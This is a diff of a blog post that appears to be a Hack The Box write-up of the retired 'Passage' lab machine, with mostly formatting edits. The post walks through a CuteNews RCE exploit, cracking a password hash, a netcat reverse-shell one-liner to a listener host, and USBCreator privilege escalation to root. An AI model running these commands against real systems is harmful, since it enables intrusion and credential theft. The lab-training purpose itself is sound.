@@ -13,7 +13,7 @@ header:
 
 Hello everyone!
 
-The box of this week will be Passage, a medium-rated Linux box from Hack The Box created by [ChefByzen](https://www.hackthebox.eu/home/users/profile/140851). 
+The box of this week will be Passage, a medium-rated Linux box from Hack The Box created by [ChefByzen](https://www.hackthebox.eu/home/users/profile/140851).
 
 :information_source: **Info**: Write-ups for Hack The Box are always posted as soon as machines get retired.
 {: .notice--info}
@@ -22,7 +22,7 @@ The box of this week will be Passage, a medium-rated Linux box from Hack The Box
 
 Started the enumeration, as usual, by running `nmap` quickscan to check what is running on this box.
 
-```
+```bash
 $ nmap -sC -sV -Pn -oA quick 10.10.10.206
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-25 12:58 -03
@@ -46,13 +46,13 @@ Nmap done: 1 IP address (1 host up) scanned in 10.65 seconds
 
 ### 80/TCP - HTTP Service
 
-Accessing the web page noticed that it is a blog built using **[CuteNews](http://cutephp.com/)** and the first post is very interesting, mentioning that Fail2Ban was recently implemented. This will prevent us from using any kind of brute force enumeration (`dirbuster` and related tools/techniques). 
+Accessing the web page noticed that it is a blog built using **[CuteNews](http://cutephp.com/)** and the first post is very interesting, mentioning that Fail2Ban was recently implemented. This will prevent us from using any kind of brute force enumeration (`dirbuster` and related tools/techniques).
 
 ![image-20210225141945974](https://i.imgur.com/XLBq0J7.png){: .align-center}
 
-Inspecting the source code of the page, while searching for interesting links, found some e-mail addresses, besides the **passage.htb** domain, which was added to the local hosts file. 
+Inspecting the source code of the page, while searching for interesting links, found some e-mail addresses, besides the **passage.htb** domain, which was added to the local hosts file.
 
-```
+```bash
 $ curl -L http://10.10.10.206 | grep -Eo 'href="(.*)"' | grep -v 'index.php' | sort -u
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -67,7 +67,7 @@ href="mailto:paul@passage.htb"
 href="mailto:sid@example.com"
 ```
 
-After some research about the product, found the administration page at `http://passage.htb/CuteNews` where I could identify the running version, which is **2.1.2**. 
+After some research about the product, found the administration page at `http://passage.htb/CuteNews` where I could identify the running version, which is **2.1.2**.
 
 ![image-20210225154213926](https://i.imgur.com/cYxMtVe.png){: .align-center}
 
@@ -75,8 +75,8 @@ After some research about the product, found the administration page at `http://
 
 Checking existing exploits for this product version, found 4 alternatives in `searchsploit` where I've used the last one, **48800**,  to which I also needed to make some adjustments.
 
-```
-$ searchsploit cutenews 2.1.2
+```bash
+searchsploit cutenews 2.1.2
 ---------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                        |  Path
 ---------------------------------------------------------------------- ---------------------------------
@@ -90,7 +90,7 @@ Shellcodes: No Results
 
 At first execution not only got a reverse shell but also a dump of all password hashes
 
-```
+```bash
 $ python3 48800.py
 
 
@@ -138,9 +138,9 @@ Dropping to a SHELL
 command > 
 ```
 
-Cracking these hashes using john found a password **atlanta1**, which belongs to user **paul**, which I have discovered after some edits in the script to disclose this information, as seen below. 
+Cracking these hashes using john found a password **atlanta1**, which belongs to user **paul**, which I have discovered after some edits in the script to disclose this information, as seen below.
 
-```
+```bash
 Enter the URL> http://passage.htb
 ================================================================
 Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
@@ -148,7 +148,7 @@ Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
 paul@passage.htb:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
 ```
 
-```
+```bash
 $ john -format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hashes
 Created directory: /home/zurc/.john
 Using default input encoding: UTF-8
@@ -162,7 +162,7 @@ Use the "--show --format=Raw-SHA256" options to display all of the cracked passw
 Session completed
 ```
 
-With the obtained RCE as **www-data**, sent payload and retrieved an interactive reverse shell using the payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f`. 
+With the obtained RCE as **www-data**, sent payload and retrieved an interactive reverse shell using the payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f`.
 
 ## User flag
 
@@ -172,13 +172,13 @@ After running `linpeas.sh` found some interesting information:
 
 - This box is vulnerable to **USBCreator**
 
-  ```
+  ```bash
   [+] USBCreator
   [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
   Vulnerable!!
   ```
 
-  Besides having this vulnerability in place, when tried to exploit it like explained in [this link](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) it didn't worked due to lack of permissions, which will probably work with another user. 
+  Besides having this vulnerability in place, when tried to exploit it like explained in [this link](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) it didn't worked due to lack of permissions, which will probably work with another user.
 
   ```bash
   www-data@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/somefilename true
@@ -188,25 +188,24 @@ After running `linpeas.sh` found some interesting information:
 
 - Noted other 2 users in this box, where these were initially listed as e-mail addresses in the page and Paul called us attention once this is a user to which we have already cracked a password.
 
-  ```
+  ```bash
   [+] Users with console
   nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
   paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
   root:x:0:0:root:/root:/bin/bash
   ```
 
-- Permissions for the console users, where **nadav** is the one that holds more privileges in the system, including being a member of **sudo** group. 
+- Permissions for the console users, where **nadav** is the one that holds more privileges in the system, including being a member of **sudo** group.
 
-  ```
+  ```bash
   [+] All users & groups
   uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
   uid=1001(paul) gid=1001(paul) groups=1001(paul)
   ```
-  
 
  First thing to test is Paul credentials, which worked successfully at first try and allowed us to get the user flag! :smile:
 
-```
+```bash
 www-data@passage:~$ su paul
 Password:
 paul@passage:~$ cat user.txt
@@ -218,9 +217,9 @@ paul@passage:~$
 
 First thing to do with *paul* credentials was another attempt to exploit USBCreator vulnerability, which failed just like www-data due to insufficient privileges.
 
-Analyzing the user's home directory, found a RSA keypair where Paul authored it to ssh without credentials adding the public key inside `authorized_keys` file. 
+Analyzing the user's home directory, found a RSA keypair where Paul authored it to ssh without credentials adding the public key inside `authorized_keys` file.
 
-```
+```bash
 paul@passage:~/.ssh$ ls -la
 total 24
 drwxr-xr-x  2 paul paul 4096 Jul 21  2020 .
@@ -242,9 +241,10 @@ Last login: Thu Feb 25 13:41:27 2021 from 10.10.10.10
 nadav@passage:~$ id
 uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
 ```
-Finally, now as **nadav**, gave another try to USBCreator vulnerability and this time we had success once we have all required permissions to execute it. 
 
-The USBCreator exploit allow us to get a file using root permission. If you only want to get the flag you can run the command below copying the file `root.txt` to the `/tmp` directory. 
+Finally, now as **nadav**, gave another try to USBCreator vulnerability and this time we had success once we have all required permissions to execute it.
+
+The USBCreator exploit allow us to get a file using root permission. If you only want to get the flag you can run the command below copying the file `root.txt` to the `/tmp` directory.
 
 ```bash
 nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/somefilename true
@@ -268,6 +268,6 @@ root@passage:~# cat /root/root.txt
 <redacted>
 ```
 
-I hope it was somehow useful! 
+I hope it was somehow useful!
 
 See you in the next post! :smile:
